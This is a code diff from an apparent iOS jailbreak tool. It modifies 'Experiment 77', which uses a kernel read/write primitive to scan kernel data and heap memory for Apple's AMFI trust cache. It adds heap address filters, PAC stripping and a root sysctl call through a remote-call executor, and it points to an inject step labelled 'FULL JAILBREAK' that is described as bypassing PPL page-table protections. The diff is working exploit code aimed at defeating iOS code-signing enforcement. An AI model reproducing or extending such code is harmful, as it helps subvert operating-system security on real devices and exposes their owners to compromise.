@@ -174,11 +174,20 @@ private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
     return ds_kread64_safe(va)
 }
 
-/// Kernel __TEXT/__DATA/heap — NOT physmap (mis-read → copy_validate panic at 0xfffffffb…).
+/// Kernel __TEXT / __DATA static (0xfffffff0… band only).
 private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
     guard va >= 0xfffffff007000000, va < 0xfffffffc00000000 else { return false }
-    if va >= 0xffffffdc00000000 && va < 0xffffffe600000000 { return false }
     if va >= 0xfffffffa00000000 { return false }
+    return true
+}
+
+/// kalloc heap (amfid/proc/trust cache — 0xdd/0xde/0xe0…). Jangan pakai aturan physmap 0xdc–0xe6 di sini.
+private func isSafeKernelHeapKreadAddress(_ va: UInt64) -> Bool {
+    guard va >= 0xffffffdd00000000, va < 0xffffffe800000000 else { return false }
+    if va >= 0xfffffffa00000000 { return false }
+    if let gVirt = PhysmapConstants.load()?.gVirtBase {
+        if va >= gVirt, va < gVirt &+ 0x80000000 { return false }
+    }
     return true
 }
 
@@ -190,7 +199,7 @@ private func isInPPLDataRegion(_ va: UInt64, kernTextBase: UInt64) -> Bool {
 
 /// Trust cache runtime object is heap (kalloc), not static __DATA / __ppl_data.
 private func isLikelyTrustCacheHeapPointer(_ v: UInt64, kernTextBase: UInt64) -> Bool {
-    guard v >= 0xffffffe000000000 && v < 0xffffffe800000000 else { return false }
+    guard isSafeKernelHeapKreadAddress(v) else { return false }
     return !isInPPLDataRegion(v, kernTextBase: kernTextBase)
 }
 
@@ -201,6 +210,16 @@ private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
 
 private func safeKread32Kernel(_ va: UInt64) -> UInt32 {
     guard isSafeKernelKreadAddress(va) else { return 0 }
+    return ds_kread32_safe(va)
+}
+
+private func safeKread64Heap(_ va: UInt64) -> UInt64 {
+    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
+    return ds_kread64_safe(va)
+}
+
+private func safeKread32Heap(_ va: UInt64) -> UInt32 {
+    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
     return ds_kread32_safe(va)
 }
 
@@ -703,22 +722,10 @@ struct AMFIExperimentView: View {
         }
     }
 
-    /// Probe is read-only KRW — avoid holding launchd (same class of panic as Exp 74).
+    /// Probe = KRW scan + sysctl (root RC, bukan amfid — tidak hang).
     private func runExp77Probe() {
-        isRunning = true
-        runningLabel = "TC Probe"
-        guard mgr.dsready else {
-            isRunning = false
-            runningLabel = ""
-            return
-        }
-        DispatchQueue.global(qos: .userInitiated).async {
-            let result = self.expTrustCacheWrite(rc: nil, dryRun: true)
-            DispatchQueue.main.async {
-                self.results.insert(result, at: 0)
-                self.isRunning = false
-                self.runningLabel = ""
-            }
+        runExperiment(label: "TC Probe", operation: "exp77_probe", append: true) { rc in
+            self.expTrustCacheProbeSafe(rc: rc)
         }
     }
 
@@ -4119,13 +4126,12 @@ struct AMFIExperimentView: View {
     
     // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)
 
-    /// Read-only probe: direct KRW on kernel __DATA only — no pmap/physmap (panic at 0xfffffffbffffffff).
-    private func expTrustCacheProbeSafe() -> ExperimentResult {
+    /// Read-only probe: __DATA globals → heap struct (PAC strip), no __ppl_data / physmap.
+    private func expTrustCacheProbeSafe(rc: RemoteCall? = nil) -> ExperimentResult {
         let expName = "Trust Cache Probe (Exp 77)"
         var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
         detail += "====================================================\n\n"
-        detail += "Mode: PROBE — tanpa pmap chain / physmap / page-table walk\n"
-        detail += "(penyebab panic: ds_kread ke VA physmap salah)\n\n"
+        detail += "Mode: __DATA pointer scan + heap verify (tanpa __ppl_data / physmap)\n\n"
 
         guard PhysmapConstants.isVerified else {
             detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
@@ -4150,8 +4156,8 @@ struct AMFIExperimentView: View {
 
         func tryTrustCachePointer(_ val: UInt64, label: String) -> Bool {
             guard isLikelyTrustCacheHeapPointer(val, kernTextBase: kernBase) else { return false }
-            let tcVer = safeKread32Kernel(val)
-            let tcCnt = safeKread32Kernel(val + 4)
+            let tcVer = safeKread32Heap(val)
+            let tcCnt = safeKread32Heap(val + 4)
             guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
             detail += "🎯 Trust cache \(label)!\n"
             detail += "  ptr: 0x\(String(format: "%llx", val))\n"
@@ -4166,7 +4172,7 @@ struct AMFIExperimentView: View {
         for off in stride(from: UInt64(0), to: PhysmapConstants.pplDataOffsetFromData, by: 8) {
             let addr = dataSegBase + off
             guard isSafeKernelKreadAddress(addr), !isInPPLDataRegion(addr, kernTextBase: kernBase) else { continue }
-            let val = safeKread64Kernel(addr)
+            let val = ds_kreadptr(addr)
             if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
                 break
             }
@@ -4178,28 +4184,45 @@ struct AMFIExperimentView: View {
             for off in stride(from: UInt64(0x4000), to: UInt64(0x5000), by: 8) {
                 let addr = dataSegBase + off
                 guard isSafeKernelKreadAddress(addr), !isInPPLDataRegion(addr, kernTextBase: kernBase) else { continue }
-                let val = safeKread64Kernel(addr)
+                let val = ds_kreadptr(addr)
                 if tryTrustCachePointer(val, label: "pmap_cs band+0x\(String(format: "%x", off))") {
                     break
                 }
             }
         }
 
+        if tcStructAddr == 0, let rc {
+            detail += "\n=== sysctl (AMFI trust cache count) ===\n"
+            let mem = rc.base
+            let tcName = remote_alloc_str(rc, "security.mac.amfi.trust_cache_count")
+            let tcBuf = mem + 0x2800
+            let tcSize = mem + 0x2A00
+            rc[tcSize].setValue64(8)
+            let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcName, tcBuf, tcSize, 0, 0)
+            if tcRet == 0 {
+                let n = rc[tcBuf].value64()
+                detail += "trust_cache_count: \(n) (kernel punya TC, pointer belum di __DATA scan)\n"
+            } else {
+                detail += "sysctl ret=\(tcRet)\n"
+            }
+            RootExecutor.rcall(rc, "free", tcName)
+        }
+
         guard tcStructAddr != 0 else {
             detail += "\n❌ Pointer trust cache (heap) tidak ditemukan di __DATA aman.\n"
-            detail += "__ppl_data sengaja dilewati (PPL). Coba Exp 60 sysctl atau kernelcache XPF.\n"
+            detail += "Heap band 0xdd–0xe7 + PAC strip sudah dipakai; __ppl_data tetap dilewati.\n"
             detail += "Jangan tap ③ Inject.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        detail += "\n=== Sample entries (direct KRW) ===\n"
+        detail += "\n=== Sample entries (heap KRW) ===\n"
         let entriesStart = tcStructAddr + 8
         for i in 0..<min(3, Int(tcEntryCount)) {
             let entryAddr = entriesStart + UInt64(i * 22)
-            guard isSafeKernelKreadAddress(entryAddr + 20) else { break }
-            let h0 = safeKread64Kernel(entryAddr)
-            let h1 = safeKread64Kernel(entryAddr + 8)
-            let h2 = safeKread32Kernel(entryAddr + 16)
+            guard isSafeKernelHeapKreadAddress(entryAddr + 20) else { break }
+            let h0 = safeKread64Heap(entryAddr)
+            let h1 = safeKread64Heap(entryAddr + 8)
+            let h2 = safeKread32Heap(entryAddr + 16)
             detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
         }
 
@@ -4220,7 +4243,7 @@ struct AMFIExperimentView: View {
     /// Writing through physmap bypasses PPL's page table protections entirely.
     private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
         if dryRun {
-            return expTrustCacheProbeSafe()
+            return expTrustCacheProbeSafe(rc: rc)
         }
 
         let expName = "🏆 FULL JAILBREAK (Exp 77)"
